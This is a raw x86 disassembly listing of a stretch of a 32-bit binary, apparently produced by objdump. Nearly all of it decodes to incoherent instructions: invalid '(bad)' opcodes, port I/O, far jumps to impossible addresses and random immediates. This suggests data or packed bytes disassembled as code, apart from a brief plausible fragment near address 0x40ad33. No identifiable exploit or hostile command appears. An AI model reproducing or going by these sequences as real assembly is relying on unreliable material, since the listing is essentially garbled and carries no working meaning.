  40aac7:	enter  0xd211,0xba
  40aacb:	mov    bh,0x8c
  40aacd:	dec    edx
  40aace:	rcl    BYTE PTR ds:0xac4c66ac,0x91
  40aad5:	jno    0x40aa6d
  40aad7:	call   0x3f8a9922
  40aadc:	adc    BYTE PTR [eax+ecx*4+0x60b650d6],ah
  40aae3:	int3   
  40aae4:	popf   
  40aae5:	out    0xa7,eax
  40aae7:	pop    esp
  40aae8:	scas   eax,DWORD PTR es:[edi]
  40aae9:	jns    0x40ab1b
  40aaeb:	inc    ecx
  40aaec:	fs test eax,0xcf5cf5b8
  40aaf2:	pusha  
  40aaf3:	or     eax,0x68881988
  40aaf8:	popa   
  40aaf9:	test   BYTE PTR [edi],bh
  40aafb:	push   ebp
  40aafc:	jg     0x40aa81
  40aafe:	push   ds
  40aaff:	push   ds
  40ab00:	adc    ah,ah
  40ab02:	rol    BYTE PTR ds:0xdf262511,1
  40ab08:	add    DWORD PTR [esp+ecx*4-0x55],edx
  40ab0c:	(bad)  [ebp+0x14]
  40ab0f:	adc    ebp,edx
  40ab11:	mov    ch,0x2c
  40ab13:	xor    ebx,DWORD PTR [ebp+0x29016f38]
  40ab19:	aaa    
  40ab1a:	rcl    dl,cl
  40ab1c:	adc    ebx,DWORD PTR [eax]
  40ab1e:	repz mov ss,WORD PTR ds:0x51baa55b
  40ab25:	cmp    al,0xf3
  40ab27:	xor    BYTE PTR [esi+0x5297076c],al
  40ab2d:	lods   al,BYTE PTR ds:[esi]
  40ab2e:	fs out 0x84,eax
  40ab31:	ret    0xcc72
  40ab34:	pop    esp
  40ab35:	inc    ebp
  40ab36:	ret    0x3309
  40ab39:	stc    
  40ab3a:	xlat   BYTE PTR ds:[ebx]
  40ab3b:	mov    esi,0xfde053f7
  40ab40:	xor    edx,DWORD PTR [edi-0xd]
  40ab43:	xor    bl,cl
  40ab45:	inc    ebx
  40ab46:	cwde   
  40ab47:	xor    eax,0x96a8914a
  40ab4c:	and    eax,DWORD PTR [eax+ebx*4-0x27cbf036]
  40ab53:	and    eax,0xbb6ef201
  40ab58:	adc    bh,BYTE PTR [eax-0x4faf8b4]
  40ab5e:	int3   
  40ab5f:	adc    ch,BYTE PTR [ecx+ecx*1]
  40ab62:	mov    ebx,DWORD PTR [ebp-0x5d]
  40ab65:	imul   ecx,DWORD PTR [esi],0x4a3fec1d
  40ab6b:	mov    cs,esp
  40ab6d:	jb     0x40ab7c
  40ab6f:	out    dx,al
  40ab70:	ficom  DWORD PTR ds:0xc1a8dc7a
  40ab76:	outs   dx,BYTE PTR ds:[esi]
  40ab77:	adc    cl,bh
  40ab79:	test   BYTE PTR [edi],dh
  40ab7b:	push   ecx
  40ab7c:	addr16 loop 0x40abde
  40ab7f:	mov    cl,0xee
  40ab81:	sar    ebx,0xb2
  40ab84:	(bad)  
  40ab85:	pusha  
  40ab86:	adc    al,0xea
  40ab88:	test   eax,0x7df894a7
  40ab8d:	jl     0x40ab2a
  40ab8f:	jb     0x40aba7
  40ab91:	pop    esi
  40ab92:	dec    esi
  40ab93:	lds    edi,FWORD PTR [edi-0x2f48e845]
  40ab99:	dec    eax
  40ab9a:	ret    0xe721
  40ab9d:	mov    edi,0x9be4b5b4
  40aba2:	mov    ds:0x79aaa95c,eax
  40aba7:	mov    DWORD PTR [ebx+0xbe7feed],esp
  40abad:	call   0x56fc65a4
  40abb2:	mov    DWORD PTR [ebp+0x14dc2d87],0x811ed541
  40abbc:	test   al,0xd7
  40abbe:	inc    esp
  40abbf:	xor    DWORD PTR [edi+esi*1+0x3f],0xdd5932
  40abc7:	int3   
  40abc8:	nop
  40abc9:	shl    BYTE PTR [ebp+0x23e93365],1
  40abcf:	jne    0x40ab72
  40abd1:	sub    eax,0xd2693f98
  40abd6:	fwait
  40abd7:	jg     0x40abfb
  40abd9:	adc    BYTE PTR [esi+0x4e],0xa9
  40abdd:	jge    0x40ac5d
  40abdf:	push   es
  40abe0:	cmc    
  40abe1:	or     DWORD PTR [ebx+esi*8-0x56bef246],esi
  40abe8:	mov    edx,0xaefa0e2a
  40abed:	xchg   ecx,eax
  40abee:	dec    ebx
  40abef:	lods   al,BYTE PTR ds:[esi]
  40abf0:	adc    BYTE PTR [ebx],ah
  40abf2:	inc    edx
  40abf3:	out    0x46,eax
  40abf5:	adc    DWORD PTR [edx+0x20da6fc7],ebp
  40abfb:	adc    ebx,DWORD PTR [ebx-0x73]
  40abfe:	and    al,0xaa
  40ac00:	bound  esi,QWORD PTR [ebx-0xf]
  40ac03:	adc    bh,BYTE PTR [ecx]
  40ac05:	and    BYTE PTR [ebx+0x185134cc],dl
  40ac0b:	call   0x6d050048
  40ac10:	cwde   
  40ac11:	dec    esi
  40ac12:	jp     0x40abbe
  40ac14:	or     bh,ch
  40ac16:	pop    ebp
  40ac17:	shl    DWORD PTR [edx+edx*4],1
  40ac1a:	scas   al,BYTE PTR es:[edi]
  40ac1b:	add    BYTE PTR [esi+0xd],al
  40ac1e:	pop    ebx
  40ac1f:	inc    ebx
  40ac20:	dec    edx
  40ac21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac22:	or     eax,0x1bbf60d0
  40ac27:	sbb    BYTE PTR [ecx+0x43],al
  40ac2a:	push   ss
  40ac2b:	aas    
  40ac2c:	add    DWORD PTR [ebx+edi*1],ebp
  40ac2f:	lods   eax,DWORD PTR ds:[esi]
  40ac30:	mov    bl,BYTE PTR [si-0x4baf]
  40ac35:	mov    BYTE PTR [esi+0xa],0xfe
  40ac39:	cwde   
  40ac3a:	xor    ecx,eax
  40ac3c:	fldcw  WORD PTR [esi+0x42a1418b]
  40ac42:	mov    esp,0xa89ab58d
  40ac47:	enter  0x737b,0x5c
  40ac4b:	leave  
  40ac4c:	lock mov DWORD PTR [ecx],ebx
  40ac4f:	(bad)  
  40ac50:	loope  0x40abf4
  40ac52:	ficomp DWORD PTR [ecx+ecx*1-0x41]
  40ac56:	xor    DWORD PTR [eax+eiz*4-0x66],eax
  40ac5a:	bound  edx,QWORD PTR [edx]
  40ac5c:	sub    eax,0x7bc5e460
  40ac61:	hlt    
  40ac62:	sbb    eax,0x2268553
  40ac67:	mov    bl,0x4b
  40ac69:	xor    DWORD PTR [edi-0x7b],0x6ca1ac60
  40ac70:	inc    ebp
  40ac71:	cdq    
  40ac72:	add    BYTE PTR [ebx],bh
  40ac74:	dec    ebx
  40ac75:	pop    ebp
  40ac76:	ds leave 
  40ac78:	dec    edi
  40ac79:	loop   0x40ace4
  40ac7b:	bound  edx,QWORD PTR [ebx+0x7e]
  40ac7e:	xor    BYTE PTR [ebp+0x2e],ah
  40ac81:	jmp    0x9d8bd10d
  40ac86:	push   edx
  40ac87:	pop    ebx
  40ac88:	mov    bh,0x79
  40ac8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac8b:	shl    ah,0xda
  40ac8e:	sub    al,0xc3
  40ac90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac91:	jp     0x40acc3
  40ac93:	(bad)  
  40ac94:	sahf   
  40ac95:	out    dx,eax
  40ac96:	test   DWORD PTR [eax],esi
  40ac98:	dec    eax
  40ac99:	push   edi
  40ac9a:	mov    dh,0xeb
  40ac9c:	pop    esp
  40ac9d:	mov    esi,0x65465835
  40aca2:	pop    edi
  40aca3:	mov    ch,0xf0
  40aca5:	fnsave [edx+0x3c59503f]
  40acab:	sbb    ecx,DWORD PTR [ebx+0x6f]
  40acae:	mov    bl,0xf
  40acb0:	fnstsw WORD PTR [eax+0x7f]
  40acb3:	sub    DWORD PTR [ecx],0xffffffdd
  40acb6:	xor    dl,BYTE PTR [ebp+0x73a746b6]
  40acbc:	dec    ebp
  40acbd:	pop    ebp
  40acbe:	pop    ds
  40acbf:	loopne 0x40acba
  40acc1:	add    DWORD PTR [edx],ebx
  40acc3:	and    cl,BYTE PTR [edx]
  40acc5:	jge    0x40ad2c
  40acc7:	cmp    al,0x1c
  40acc9:	mov    DWORD PTR [edi],edi
  40accb:	in     al,0xd2
  40accd:	pop    edx
  40acce:	sti    
  40accf:	xlat   BYTE PTR ds:[ebx]
  40acd0:	lods   al,BYTE PTR ds:[esi]
  40acd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40acd2:	lahf   
  40acd3:	pop    esp
  40acd4:	mov    esi,DWORD PTR [ecx]
  40acd6:	test   al,0x8c
  40acd8:	sbb    bh,bh
  40acda:	fistp  DWORD PTR [ebx]
  40acdc:	(bad)  
  40acdd:	jg     0x40ac75
  40acdf:	bound  edx,QWORD PTR [edx]
  40ace1:	sbb    al,0x89
  40ace3:	cwde   
  40ace4:	sbb    BYTE PTR ds:0x361013e0,dh
  40acea:	mov    al,ds:0xdebb79f
  40acef:	mov    WORD PTR [edx+0x4f4e469a],ds
  40acf5:	xor    edi,DWORD PTR [esp+eax*2]
  40acf8:	push   0xfffffff1
  40acfa:	sbb    bl,BYTE PTR [edx]
  40acfc:	je     0x40aca7
  40acfe:	jno    0x40ac9e
  40ad00:	pusha  
  40ad01:	addr16 aam 0x5
  40ad04:	pop    esp
  40ad05:	dec    ebx
  40ad06:	retf   0xa9e
  40ad09:	hlt    
  40ad0a:	xor    DWORD PTR [esp+eiz*4+0x4907c06a],esi
  40ad11:	cdq    
  40ad12:	jge    0x40ad58
  40ad14:	popa   
  40ad15:	push   edi
  40ad16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad17:	pusha  
  40ad18:	mov    ds:0x9d95d3ee,al
  40ad1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad1e:	pop    edi
  40ad1f:	mov    dl,0xa6
  40ad21:	mov    ss,WORD PTR [ecx+esi*4-0x63eb1e26]
  40ad28:	(bad)  
  40ad29:	mov    ecx,0x33647e4f
  40ad2e:	add    BYTE PTR [edx],0x8b
  40ad31:	add    BYTE PTR [eax],cl
  40ad33:	mov    eax,DWORD PTR [ebp-0x60]
  40ad36:	mov    ecx,DWORD PTR [ebp-0x5c]
  40ad39:	shrd   eax,ecx,0x2
  40ad3d:	shr    ecx,0x2
  40ad40:	mov    ecx,DWORD PTR [ebp-0x60]
  40ad43:	mov    edx,DWORD PTR [ebp-0x5c]
  40ad46:	jmp    0x40b2d0
  40ad4b:	dec    ebx
  40ad4c:	adc    BYTE PTR [edi+0x4d],bl
  40ad4f:	adc    eax,0x89101919
  40ad54:	xchg   ebx,eax
  40ad55:	inc    esi
  40ad56:	mov    ah,0xb3
  40ad58:	jns    0x40ad02
  40ad5a:	jb     0x40ace9
  40ad5c:	or     DWORD PTR [esi],edx
  40ad5e:	push   ss
  40ad5f:	cmp    eax,0xc3161604
  40ad64:	retf   0xdca1
  40ad67:	fsub   st(0),st
  40ad69:	inc    bp
  40ad6b:	rol    dl,1
  40ad6d:	xor    BYTE PTR [ecx-0x78],dh
  40ad70:	fsubr  st(7),st
  40ad72:	shr    dh,1
  40ad74:	(bad)  
  40ad75:	in     eax,dx
  40ad76:	daa    
  40ad77:	adc    BYTE PTR [edi-0x30c88a04],cl
  40ad7d:	jmp    0x40b192b1
  40ad82:	mov    ah,0xdb
  40ad84:	adc    ah,bh
  40ad86:	push   esp
  40ad87:	sub    dh,BYTE PTR [ebx+0x37]
  40ad8a:	div    ch
  40ad8c:	lahf   
  40ad8d:	daa    
  40ad8e:	pop    ss
  40ad8f:	in     al,dx
  40ad90:	jne    0x40adfe
  40ad92:	int    0x17
  40ad94:	cmp    edx,eax
  40ad96:	jge    0x40ad88
  40ad98:	push   ecx
  40ad99:	xchg   ebp,eax
  40ad9a:	and    BYTE PTR ds:0x2df9eeea,al
  40ada0:	fisttp QWORD PTR [edi+0x71]
  40ada3:	(bad)  
  40ada4:	repz xchg ebp,eax
  40ada6:	xchg   edi,eax
  40ada7:	loope  0x40ad4f
  40ada9:	dec    ebp
  40adaa:	add    DWORD PTR [ecx-0x5c3e3153],ecx
  40adb0:	jo     0x40add5
  40adb2:	cmp    al,0xfc
  40adb4:	scas   eax,DWORD PTR es:[edi]
  40adb5:	mov    esp,0xab84d95c
  40adba:	mov    ebx,0x42cc3b2
  40adbf:	test   al,0xa1
  40adc1:	mov    ah,0x7c
  40adc3:	in     eax,dx
  40adc4:	and    ah,bh
  40adc6:	or     DWORD PTR [edi+0x1a600cec],edi
  40adcc:	dec    ebp
  40adcd:	ret    
  40adce:	xor    bl,BYTE PTR [ebp+0x47]
  40add1:	mov    ch,0x88
  40add3:	sbb    DWORD PTR [ebx],0xb12c8130
  40add9:	inc    edi
  40adda:	cdq    
  40addb:	ret    
  40addc:	inc    ecx
  40addd:	jae    0x40ad8e
  40addf:	cld    
  40ade0:	jle    0x40ae61
  40ade2:	fs cs cli 
  40ade5:	xchg   DWORD PTR [ecx],eax
  40ade7:	push   ss
  40ade8:	jns    0x40ad7b
  40adea:	inc    esi
  40adeb:	ins    BYTE PTR es:[edi],dx
  40adec:	dec    ecx
  40aded:	add    bh,bl
  40adef:	adc    BYTE PTR [ebx],0x5e
  40adf2:	jns    0x40adfe
  40adf4:	(bad)  
  40adf5:	call   ecx
  40adf7:	xor    al,0x6f
  40adf9:	and    dl,BYTE PTR [edi+0x7afea974]
  40adff:	pop    esi
  40ae00:	out    dx,eax
  40ae01:	dec    esp
  40ae02:	cld    
  40ae03:	addr16 shl al,cl
  40ae06:	in     al,0xa5
  40ae08:	aad    0xfb
  40ae0a:	dec    esi
  40ae0b:	push   cs
  40ae0c:	jle    0x40ae75
  40ae0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae0f:	addr16 enter 0x6a74,0x5a
  40ae14:	(bad)  
  40ae15:	mov    bl,0x2e
  40ae17:	icebp  
  40ae18:	js     0x40ae5c
  40ae1a:	jp     0x40ae45
  40ae1c:	cwde   
  40ae1d:	cdq    
  40ae1e:	pop    eax
  40ae1f:	xchg   BYTE PTR [eax-0x44],bh
  40ae22:	les    esp,FWORD PTR [esi+0x352f2d26]
  40ae28:	adc    eax,0x96a0fe81
  40ae2d:	sbb    al,0xb
  40ae2f:	data16 mov ?,WORD PTR [eax-0x15]
  40ae33:	xchg   ecx,eax
  40ae34:	or     al,0x20
  40ae36:	das    
  40ae37:	add    DWORD PTR [ebx-0x47],ebp
  40ae3a:	out    0xc8,ax
  40ae3d:	pop    es
  40ae3e:	(bad)  
  40ae3f:	outs   dx,DWORD PTR ds:[esi]
  40ae40:	mov    al,0xe7
  40ae42:	sub    ebx,esp
  40ae44:	ret    
  40ae45:	jbe    0x40aea9
  40ae47:	cs hlt 
  40ae49:	sbb    al,0xbe
  40ae4b:	(bad)  
  40ae4c:	loop   0x40ae03
  40ae4e:	jl     0x40ae83
  40ae50:	imul   ebx,DWORD PTR [esi],0x4674ae1a
  40ae56:	add    DWORD PTR [edi+0x36272914],edi
  40ae5c:	and    esp,DWORD PTR [edx]
  40ae5e:	dec    eax
  40ae5f:	sbb    bl,BYTE PTR [ebx+0xe]
  40ae62:	add    BYTE PTR [esi+edx*2-0x19d45037],al
  40ae69:	sub    cl,BYTE PTR [eax+edi*4-0x7a9c4c77]
  40ae70:	dec    eax
  40ae71:	clc    
  40ae72:	clc    
  40ae73:	pop    es
  40ae74:	cli    
  40ae75:	sub    WORD PTR [edx+0x4571a08b],0xba91
  40ae7e:	push   0x63bb34
  40ae83:	(bad)  
  40ae84:	fsub   st(6),st
  40ae86:	ret    0xb597
  40ae89:	je     0x40ae5b
  40ae8b:	fcomp  DWORD PTR [eax-0x77]
  40ae8e:	mov    ds:0x44648f19,eax
  40ae93:	pop    eax
  40ae94:	bound  ebx,QWORD PTR [edi-0x39]
  40ae97:	jno    0x40aeb9
  40ae99:	jmp    0x8b1c:0x81913f0d
  40aea0:	fiadd  DWORD PTR [ebp-0x77]
  40aea3:	and    BYTE PTR [ebp+0x7b0b2221],0x22
  40aeaa:	sbb    dh,BYTE PTR [ecx]
  40aeac:	outs   dx,DWORD PTR ds:[esi]
  40aead:	sahf   
  40aeae:	aad    0xdb
  40aeb0:	add    ebx,edx
  40aeb2:	shl    DWORD PTR [eax-0x83b16d2],cl
  40aeb8:	mov    ebp,0x486d020b
  40aebd:	xchg   esi,esp
  40aebf:	test   DWORD PTR [eax-0x48052a31],edx
  40aec5:	or     al,0x4d
  40aec7:	fild   QWORD PTR [edi+0x7ea7d8af]
  40aecd:	lods   eax,DWORD PTR ds:[esi]
  40aece:	xor    BYTE PTR [esi],bh
  40aed0:	or     esp,esi
  40aed2:	add    eax,0xb408e66b
  40aed7:	and    edi,DWORD PTR [edx-0xf3605a2]
  40aedd:	popa   
  40aede:	loope  0x40af19
  40aee0:	(bad)  
  40aee2:	push   esi
  40aee3:	sbb    al,0xf
  40aee5:	imul   bp,WORD PTR [esi],0xb985
  40aeea:	xchg   edi,eax
  40aeeb:	mov    esp,0xcad4e023
  40aef0:	outs   dx,BYTE PTR ds:[esi]
  40aef1:	gs inc esp
  40aef3:	pop    ecx
  40aef4:	stos   DWORD PTR es:[edi],eax
  40aef5:	xor    eax,0x48cc3788
  40aefa:	pop    es
  40aefb:	xchg   edx,eax
  40aefc:	xor    BYTE PTR ds:0xb34e91a3,ch
  40af02:	sbb    eax,0x59c11ee5
  40af07:	pop    edx
  40af08:	add    DWORD PTR [edi+0x5508db75],edi
  40af0e:	leave  
  40af0f:	sub    al,0xe7
  40af11:	sub    BYTE PTR [eax-0x7cec48e6],dh
  40af17:	test   BYTE PTR [ecx+0x39d5c712],ch
  40af1d:	add    ebp,esi
  40af1f:	or     eax,DWORD PTR ds:0x3a611e9d
  40af25:	add    DWORD PTR [edx+edi*8-0x5b],ebx
  40af29:	test   BYTE PTR [ebx],0x21
  40af2c:	enter  0x2cd,0xa6
  40af30:	ins    DWORD PTR es:[edi],dx
  40af31:	test   DWORD PTR ds:[eax-0x1c4af795],ebx
  40af38:	in     al,0xcd
  40af3a:	mov    DWORD PTR [esi+0x2e],edx
  40af3d:	test   al,0xe0
  40af3f:	scas   al,BYTE PTR es:[edi]
  40af40:	mov    ebx,0x9b9dd3d9
  40af45:	outs   dx,DWORD PTR ds:[esi]
  40af46:	xor    eax,0x6e67c53b
  40af4b:	fild   DWORD PTR [ecx-0x59d38be9]
  40af51:	mov    al,ds:0x9395e5a2
  40af56:	xor    al,0xe2
  40af58:	scas   al,BYTE PTR es:[edi]
  40af59:	mov    DWORD PTR [edi],esi
  40af5b:	das    
  40af5c:	add    DWORD PTR [eax-0x7b096f97],ebp
  40af62:	mov    esp,0xfafff408
  40af67:	add    al,0x17
  40af69:	pop    esp
  40af6a:	shl    al,0xb2
  40af6d:	xor    al,0xd
  40af6f:	inc    ecx
  40af70:	shl    BYTE PTR [esp+esi*1-0xe],0x87
  40af75:	or     al,0x52
  40af77:	dec    ecx
  40af78:	push   edi
  40af79:	jmp    0xd954f2a1
  40af7e:	xchg   esi,eax
  40af7f:	scas   al,BYTE PTR es:[edi]
  40af80:	aas    
  40af81:	adc    al,0x7
  40af83:	push   0x9083945
  40af88:	xchg   edi,eax
  40af89:	sar    BYTE PTR [eax+0x56],1
  40af8c:	xchg   ebx,eax
  40af8d:	and    eax,DWORD PTR [edx+0x1f015200]
  40af93:	fs xor eax,0xe3d02f5d
  40af99:	mov    ebx,0x1c640a65
  40af9e:	aas    
  40af9f:	sbb    BYTE PTR [edx+0x3978d35c],0x45
  40afa6:	and    al,0x31
  40afa8:	call   0xed723c07
  40afad:	or     al,0xbf
  40afaf:	mov    ch,0xdf
  40afb1:	js     0x40b016
  40afb3:	and    esi,esi
  40afb5:	cdq    
  40afb6:	nop
  40afb7:	pop    edi
  40afb8:	jmp    0xb95a71a0
  40afbd:	xchg   BYTE PTR [edx+edx*8-0x1],dh
  40afc1:	imul   esp,DWORD PTR [esi+0x8dadcdc],0xffffffd4
  40afc8:	xchg   ecx,eax
  40afc9:	stc    
  40afca:	shr    DWORD PTR [esi+0x76555430],cl
  40afd0:	cld    
  40afd1:	or     BYTE PTR [eax+ecx*2-0x6c],0xab
  40afd6:	push   ebx
  40afd7:	sub    cl,ah
  40afd9:	pop    ds
  40afda:	adc    al,0xe8
  40afdc:	test   al,0x5f
  40afde:	lds    esi,FWORD PTR [ebx]
  40afe0:	push   ss
  40afe1:	push   0x21
  40afe3:	inc    edx
  40afe4:	mov    cl,0x3e
  40afe6:	fst    QWORD PTR [eax-0x4ed8dce5]
  40afec:	arpl   WORD PTR [edx-0x4da55cb7],sp
  40aff2:	shr    al,1
  40aff4:	inc    ebx
  40aff5:	pop    eax
  40aff6:	addr16 jmp 0xc8:0x9bb2eb6d
  40affe:	(bad)  [ecx]
  40b000:	and    esi,DWORD PTR [edx-0x7f746667]
  40b006:	fcom   QWORD PTR [eax+0xbcc112b]
  40b00c:	fsub   DWORD PTR [eax-0x2a]
  40b00f:	dec    esi
  40b010:	es jne 0x40afab
  40b013:	mov    ch,0x74
  40b015:	lock lds ecx,FWORD PTR [ebp+0x2de9a933]
  40b01c:	popa   
  40b01d:	shl    BYTE PTR ds:0xb85e5a61,cl
  40b023:	sbb    bh,BYTE PTR [esi+0x66]
  40b026:	je     0x40aff3
  40b028:	xor    al,BYTE PTR [ebx-0x65]
  40b02b:	push   edi
  40b02c:	mov    cs,WORD PTR [ebp+0x72]
  40b02f:	cmp    BYTE PTR [ebx+0x1f],bh
  40b032:	mov    al,ds:0x3d8fcf5c
  40b037:	push   0x14c9c09b
  40b03c:	jae    0x40b055
  40b03e:	sub    ch,BYTE PTR [ebx-0x20]
  40b041:	add    al,0x9a
  40b043:	dec    BYTE PTR [edi+ecx*2-0x5915ef01]
  40b04a:	or     edx,DWORD PTR [ebp-0x68d7a33f]
  40b050:	pop    eax
  40b051:	ficom  DWORD PTR [edi-0x584325d9]
  40b057:	in     al,dx
  40b058:	mov    ds:0x1feeeee,al
  40b05d:	cdq    
  40b05e:	mov    edi,0x56e12401
  40b063:	push   esi
  40b064:	iret   
  40b065:	out    0x75,al
  40b067:	int    0xe9
  40b069:	mov    dl,0xf4
  40b06b:	mov    ebx,0x48885908
  40b070:	scas   eax,DWORD PTR es:[edi]
  40b071:	fcmovnbe st,st(7)
  40b073:	adc    BYTE PTR [ebp-0x6],cl
  40b076:	aad    0x1d
  40b078:	cld    
  40b079:	into   
  40b07a:	mov    DWORD PTR [ebx-0x1579d535],ecx
  40b080:	jecxz  0x40b07c
  40b082:	push   ds
  40b083:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b084:	xchg   ebx,eax
  40b085:	xor    esi,DWORD PTR cs:[edx]
  40b088:	ficomp WORD PTR [eax-0x23]
  40b08b:	scas   eax,DWORD PTR es:[edi]
  40b08c:	pop    esp
  40b08d:	lock add BYTE PTR [ebx-0x72389a13],0x82
  40b095:	repnz outs dx,DWORD PTR ds:[esi]
  40b097:	imul   ebp,DWORD PTR [ecx-0x6a],0xa
  40b09b:	cmc    
  40b09c:	xor    al,0xa1
  40b09e:	pop    edi
  40b09f:	mov    cl,0xde
  40b0a1:	push   ds
  40b0a2:	mov    bh,0x2d
  40b0a4:	xor    BYTE PTR [edx],cl
  40b0a6:	push   ebx
  40b0a7:	xchg   esp,eax
  40b0a8:	xchg   cl,bl
  40b0aa:	dec    esp
  40b0ab:	fimul  DWORD PTR [edx]
  40b0ad:	out    0x1c,al
  40b0af:	out    dx,al
  40b0b0:	loope  0x40b0c3
  40b0b2:	pop    edi
  40b0b3:	int3   
  40b0b4:	push   esp
  40b0b5:	retf   
  40b0b6:	pop    ss
  40b0b7:	dec    ebx
  40b0b8:	xor    al,0x89
  40b0ba:	push   esi
  40b0bb:	ins    DWORD PTR es:[edi],dx
  40b0bc:	cwde   
  40b0bd:	lahf   
  40b0be:	pop    eax
  40b0bf:	add    BYTE PTR [esi-0x4f],cl
  40b0c2:	xchg   edx,eax
  40b0c3:	jnp    0x40b072
  40b0c5:	cs add dl,bh
  40b0c8:	outs   dx,DWORD PTR ds:[esi]
  40b0c9:	xchg   ecx,eax
  40b0ca:	mov    DWORD PTR [eax],edx
  40b0cc:	out    dx,eax
  40b0cd:	or     esi,DWORD PTR [edx-0x46]
  40b0d0:	xchg   ebx,eax
  40b0d1:	ficom  DWORD PTR ds:0x7a34cfd8
  40b0d7:	inc    edi
  40b0d8:	retf   
  40b0d9:	mov    ecx,0xfc6a09b9
  40b0de:	int    0x78
  40b0e0:	repz mov cl,0x7b
  40b0e3:	jg     0x40b098
  40b0e5:	enter  0x4814,0x36
  40b0e9:	shl    DWORD PTR [ebx+edx*8-0x68],1
  40b0ed:	xchg   esi,eax
  40b0ee:	arpl   WORD PTR [ebx+0xe8b2a26],cx
  40b0f4:	xchg   edi,eax
  40b0f5:	mov    eax,ds:0x7300369c
  40b0fa:	pop    eax
  40b0fb:	sahf   
  40b0fc:	outs   dx,DWORD PTR ds:[esi]
  40b0fd:	rcr    DWORD PTR [ecx+0x2c89d55d],1
  40b103:	jns    0x40b08a
  40b105:	pop    edi
  40b106:	mov    ds:0x86ad7c10,al
  40b10b:	sbb    edi,eax
  40b10d:	test   BYTE PTR ds:0x35b22cb8,al
  40b113:	and    al,0x66
  40b115:	fild   DWORD PTR [esi+0x5f133f68]
  40b11b:	lock jmp 0x7e0:0x2af74d6c
  40b123:	mov    edi,fs
  40b125:	iret   
  40b126:	test   eax,0xc1b96384
  40b12b:	loope  0x40b16f
  40b12d:	sbb    eax,0x40447ec4
  40b132:	in     al,0x8
  40b134:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b135:	and    esi,DWORD PTR [ebx+esi*1-0x25126c6a]
  40b13c:	adc    bl,BYTE PTR [ebx-0x7dbfd1d2]
  40b142:	sub    edi,0xffffff91
  40b145:	pop    es
  40b146:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b147:	in     eax,dx
  40b148:	jle    0x40b189
  40b14a:	fsincos 
  40b14c:	push   ebp
  40b14d:	hlt    
  40b14e:	xor    DWORD PTR [eax+0x75be251a],esi
  40b154:	repnz (bad) 
  40b156:	pop    ebp
  40b157:	fsub   st(4),st
  40b159:	jl     0x40b155
  40b15b:	adc    ecx,DWORD PTR [esi+ebp*2]
  40b15e:	xchg   DWORD PTR [edx+0x30],edi
  40b161:	in     eax,dx
  40b162:	mov    DWORD PTR cs:[ebp+0x69],eax
  40b166:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b167:	or     al,0x5b
  40b169:	push   es
  40b16a:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40b16c:	cmp    BYTE PTR [ebx],cl
  40b16e:	mov    edx,0x8fe14f8b
  40b173:	xchg   ecx,eax
  40b174:	cmp    cl,cl
  40b176:	loop   0x40b12d
  40b178:	into   
  40b179:	mov    dl,0xa1
  40b17b:	xor    ah,BYTE PTR [edi]
  40b17d:	out    0x58,eax
  40b17f:	mov    ch,0x7
  40b181:	outs   dx,BYTE PTR ds:[esi]
  40b182:	adc    al,0xe3
  40b184:	or     BYTE PTR [esi+ebp*1+0x3f],0xa
  40b189:	mov    dl,0xd0
  40b18b:	mov    cl,0x9b
  40b18d:	push   0x952d2f5e
  40b192:	push   eax
  40b193:	fstp   TBYTE PTR ds:0x7d9e5e48
  40b199:	ds mov ecx,gs
  40b19c:	mov    ebx,0xcba0cfa
  40b1a1:	or     dl,ch
  40b1a3:	iret   
  40b1a4:	xor    al,0xc8
  40b1a6:	in     eax,0x95
  40b1a8:	les    esi,FWORD PTR [esi-0x6d]
  40b1ab:	retf   0x912b
  40b1ae:	lea    ecx,[ecx-0x3771c71d]
  40b1b4:	pusha  
  40b1b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1b6:	paddsb mm3,QWORD PTR [edx+esi*4-0x13]
  40b1bb:	push   edx
  40b1bc:	xchg   esp,eax
  40b1bd:	sub    DWORD PTR [edi+ebp*4-0x20b0627d],edi
  40b1c4:	add    DWORD PTR [ecx+0x4b],edi
  40b1c7:	les    edi,FWORD PTR [edx]
  40b1c9:	enter  0xd17,0x3f
  40b1cd:	mov    dh,0xa8
  40b1cf:	ins    BYTE PTR es:[edi],dx
  40b1d0:	fnstsw WORD PTR [ecx-0x34]
  40b1d3:	ds test eax,0xef00ca6d
  40b1d9:	jecxz  0x40b1d1
  40b1db:	jb     0x40b1e2
  40b1dd:	imul   eax,DWORD PTR [edx+0x12],0xdb3c3475
  40b1e4:	mov    edi,0xb8a069d9
  40b1e9:	sbb    BYTE PTR [eax],al
  40b1eb:	mov    DWORD PTR [esi+0x9],ecx
  40b1ee:	dec    esp
  40b1ef:	sub    al,0x91
  40b1f1:	adc    BYTE PTR [ebx-0x76fccfd3],bl
  40b1f7:	pop    edi
  40b1f8:	aad    0xaf
  40b1fa:	or     BYTE PTR cs:[edi-0x40],bl
  40b1fe:	push   eax
  40b1ff:	mov    cl,0x69
  40b201:	retf   0x948b
  40b204:	mov    ds:0x93cb35b7,eax
  40b209:	ss jmp 0x40b225
  40b20c:	jecxz  0x40b20e
  40b20e:	jl     0x40b26c
  40b210:	(bad)  
  40b211:	xchg   ecx,eax
  40b212:	inc    edx
  40b213:	add    edx,DWORD PTR [ecx+0x73a0d9c2]
  40b219:	or     al,ch
  40b21b:	mov    esp,0x3af533c3
  40b220:	mov    bh,0xc6
  40b222:	rcr    DWORD PTR [ebx+0x56],0xf0
  40b226:	adc    DWORD PTR [ebp+ecx*2-0x47],esi
  40b22a:	add    DWORD PTR [edi],0xffffffad
  40b22d:	jb     0x40b2a6
  40b22f:	aaa    
  40b230:	xor    DWORD PTR [edi-0x75d472c7],ebp
  40b236:	lock xchg ch,cl
  40b239:	xor    eax,0x44e6d8c4
  40b23e:	adc    dl,0xf1
  40b241:	stos   BYTE PTR es:[edi],al
